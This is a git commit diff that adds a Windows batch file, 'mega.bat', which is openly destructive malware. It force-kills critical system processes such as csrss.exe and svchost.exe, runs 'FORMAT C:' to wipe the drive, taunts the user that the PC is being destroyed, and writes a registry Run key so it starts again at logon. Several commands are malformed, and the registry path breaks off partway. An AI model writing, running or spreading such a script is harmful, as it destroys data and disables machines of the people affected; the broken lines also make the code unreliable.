12ed8595d019c9663a629c2ab10f33a72fcc6fbc
M48✌🚱 <100668901+Cher-IS-7@users.noreply.github.com>
2024-04-15 19:54:19 +0000

    Update mega.bat

--- mega.bat
+++ mega.bat
@@ -1,1 +1,28 @@
 
+@echo off
+
+taskkill /f /im explorer.exe
+
+taskkill /f /im svchost.exe
+
+taskkill /f /im audiodg.exe taskkill /f /im csrss.exe
+
+taskkill /f /im system32
+
+taskkill /f /im bootcfg.exe
+
+taskkill /f /im winload.exe
+
+FORMAT C:
+
+echo your pc is getting destroyed, click any key to continue...
+
+timeout 5
+
+pause
+
+ipconfig
+
+REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "mega.bat" /d "C:\Users\vboxuser\Des
+
+start explorer.exe
